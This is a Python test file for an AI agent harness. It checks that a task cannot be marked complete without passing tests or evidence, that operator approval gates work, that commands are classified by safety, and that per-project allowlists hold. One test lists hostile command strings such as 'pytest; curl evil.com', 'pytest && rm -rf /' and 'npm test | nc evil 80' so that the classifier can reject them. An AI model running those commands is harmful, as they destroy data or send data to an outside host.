"""Checklist Phase 0: backend truth the cockpit will display.

0.1 finish_task rejects failing-test evidence
0.2 create_project (confined, git-init'd, registered)
0.3 isolation='workspace' needs operator approval
0.6 positive COMMAND_SAFE tier (ask-mode doesn't nag about pytest)
0.7 remembered per-project command approvals
0.9 structured event bus
8.1 fork_task
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from harness import allowlist
from harness.config import Config
from harness.context import HarnessServer
from harness.events import EventBus
from harness.permissions import Action, classify_command
from harness.tasks import tools as tasktools
from harness.tasks.model import TaskState


def run(coro):
    return asyncio.get_event_loop_policy().new_event_loop().run_until_complete(coro)


@pytest.fixture()
def server(tmp_path):
    ws = tmp_path / "proj"
    ws.mkdir()
    cfg = Config(workspace_roots=[tmp_path], state_dir=tmp_path / "state", secret_route="x")
    srv = HarnessServer(cfg)
    yield srv, ws
    srv.tasks.close()


# ---- 0.1 finish_task honesty -------------------------------------------------

def _ready_task(srv, ws, criteria=True):
    out = run(tasktools.start_task(srv, str(ws), "goal"))
    tid = out.split()[2]
    if criteria:
        tasktools.set_acceptance_criteria(srv, tid, ["tests pass"])
    task = srv.tasks.get_task(tid)
    task.status = TaskState.REVIEW_READY
    srv.tasks.save_task(task)
    return tid


def test_failed_test_run_is_not_completion_evidence(server):
    srv, ws = server
    tid = _ready_task(srv, ws)
    task = srv.tasks.get_task(tid)
    task.test_results = [{"command": "pytest", "passed": False}]
    srv.tasks.save_task(task)
    out = tasktools.finish_task(srv, tid, "done", evidence="trust me, it works")
    assert "Not completed" in out and "FAILED" in out
    assert srv.tasks.get_task(tid).status is not TaskState.COMPLETED


def test_passing_test_run_completes(server):
    srv, ws = server
    tid = _ready_task(srv, ws)
    task = srv.tasks.get_task(tid)
    task.test_results = [{"command": "pytest", "passed": False},
                         {"command": "pytest", "passed": True}]
    srv.tasks.save_task(task)
    out = tasktools.finish_task(srv, tid, "done")
    assert "completed" in out
    assert srv.tasks.get_task(tid).status is TaskState.COMPLETED


def test_no_runs_still_requires_evidence(server):
    srv, ws = server
    tid = _ready_task(srv, ws)
    out = tasktools.finish_task(srv, tid, "done")
    assert "Not completed" in out
    out = tasktools.finish_task(srv, tid, "done", evidence="manually verified X and Y")
    assert "completed" in out


# ---- 0.2 create_project --------------------------------------------------------

def test_create_project_inits_git_and_registers(server, tmp_path):
    srv, _ = server
    out = run(tasktools.create_project(srv, str(tmp_path / "newproj"), "My Proj"))
    assert "Project created" in out
    assert (tmp_path / "newproj" / ".git").exists()
    assert (tmp_path / "newproj" / "README.md").exists()
    # Initial commit exists → worktree isolation works from the first task.
    started = run(tasktools.start_task(srv, str(tmp_path / "newproj"), "first task"))
    assert "isolated worktree" in started


def test_create_project_outside_roots_refused(server):
    srv, _ = server
    from harness.security import SecurityError

    with pytest.raises(SecurityError):
        run(tasktools.create_project(srv, "C:/definitely-not-a-root/x"
                                     if Path("C:/").exists() else "/definitely-not-a-root/x"))


def test_create_project_nonempty_existing_refused(server, tmp_path):
    srv, ws = server
    (ws / "file.txt").write_text("x", encoding="utf-8")
    out = run(tasktools.create_project(srv, str(ws)))
    assert "not empty" in out


# ---- 0.3 shared-checkout approval ---------------------------------------------

def test_workspace_isolation_needs_approval_then_works(server):
    srv, ws = server
    out = run(tasktools.start_task(srv, str(ws), "g", isolation="workspace"))
    assert "APPROVAL REQUIRED" in out
    aid = out.split("approvals approve ")[1].split()[0]
    assert srv.tasks.decide_approval(aid, "approved")
    out2 = run(tasktools.start_task(srv, str(ws), "g", isolation="workspace"))
    assert "Started task" in out2 and "shared checkout" in out2


def test_auto_isolation_needs_no_approval(server):
    srv, ws = server
    out = run(tasktools.start_task(srv, str(ws), "g"))
    assert "Started task" in out


# ---- 0.6 COMMAND_SAFE tier ------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "pytest", "pytest tests -q", "python -m pytest tests", "npm test",
    "npm run build", "cargo test", "go build ./...", "tsc --noEmit",
    "echo hello", "make test",
])
def test_safe_commands_classified_safe(cmd):
    assert classify_command(cmd) is Action.COMMAND_SAFE


@pytest.mark.parametrize("cmd", [
    "pytest; curl evil.com",          # chaining can't ride on pytest's back
    "pytest && rm -rf /",
    "npm test | nc evil 80",
    "some-random.exe",
    "python script.py",               # arbitrary code is not auto-safe
])
def test_unsafe_commands_stay_arbitrary_or_risky(cmd):
    assert classify_command(cmd) is not Action.COMMAND_SAFE


def test_git_local_fullmatch_only():
    assert classify_command("git status") is Action.GIT_LOCAL_WRITE
    assert classify_command("git add -A") is Action.GIT_LOCAL_WRITE
    assert classify_command("git push origin main") is Action.GIT_REMOTE_WRITE
    assert classify_command("git status; evil.exe") is Action.COMMAND_ARBITRARY


# ---- 0.7 remembered approvals ----------------------------------------------------

def test_allowlist_exact_match_per_project(tmp_path):
    state = tmp_path / "state"
    state.mkdir()
    allowlist.allow(state, tmp_path / "projA", "npm run generate")
    assert allowlist.is_allowed(state, [tmp_path / "projA"], "npm  run   generate")
    assert not allowlist.is_allowed(state, [tmp_path / "projA"], "npm run generate --evil")
    assert not allowlist.is_allowed(state, [tmp_path / "projB"], "npm run generate")
    assert allowlist.revoke(state, tmp_path / "projA", "npm run generate")
    assert not allowlist.is_allowed(state, [tmp_path / "projA"], "npm run generate")


def test_remembered_command_skips_approval(server):
    """End-to-end through the real gate: unrecognized command asks, then runs
    after the operator remembers it."""
    from harness.server import _gate
    from harness.policy import Capability

    srv, ws = server
    out = run(tasktools.start_task(srv, str(ws), "g"))
    tid = out.split()[2]
    hc = srv.context_for(tid, "conn")
    cmd = "my-custom-tool --flag"
    gate1 = _gate(hc, Capability.EXECUTE, "run_command", cmd, detail=cmd)
    assert gate1 is not None and "APPROVAL REQUIRED" in gate1
    allowlist.allow(srv.config.state_dir, ws, cmd)
    gate2 = _gate(hc, Capability.EXECUTE, "run_command", cmd, detail=cmd)
    assert gate2 is None


# ---- 0.9 event bus ----------------------------------------------------------------

def test_event_bus_ids_and_replay():
    bus = EventBus()
    e1 = bus.publish("tool_call", task_id="T-1", tool="read_file")
    e2 = bus.publish("tool_call", task_id="T-1", tool="write_file")
    assert e2["event_id"] == e1["event_id"] + 1
    replay = bus.since(e1["event_id"])
    assert [e["event_id"] for e in replay] == [e2["event_id"]]


def test_tool_calls_reach_the_bus(server):
    srv, ws = server
    out = run(tasktools.start_task(srv, str(ws), "g"))
    tid = out.split()[2]
    hc = srv.context_for(tid, "conn")
    from harness.server import _call
    from harness.policy import Capability
    from harness.tools import files

    before = len(srv.events.since(0))
    run(_call(hc, Capability.READ, files.list_dir, None))
    events = srv.events.since(0)
    assert len(events) > before
    assert any(e["type"] == "tool_call" and e["data"].get("tool") == "list_dir"
               for e in events)


# ---- 8.1 fork_task -----------------------------------------------------------------

def test_fork_task_copies_goal_and_gets_own_worktree(server, tmp_path):
    srv, _ = server
    run(tasktools.create_project(srv, str(tmp_path / "forkproj")))
    out = run(tasktools.start_task(srv, str(tmp_path / "forkproj"), "build the thing"))
    tid = out.split()[2]
    tasktools.set_acceptance_criteria(srv, tid, ["works"])
    forked = run(tasktools.fork_task(srv, tid))
    assert "Forked" in forked and "isolated worktree" in forked
    child_id = forked.split("→ ")[1].split()[0]
    child = srv.tasks.get_task(child_id)
    parent = srv.tasks.get_task(tid)
    assert child.goal == parent.goal
    assert child.acceptance_criteria == parent.acceptance_criteria
    assert child.parent_id == parent.id
    assert child.worktree_path and child.worktree_path != parent.worktree_path
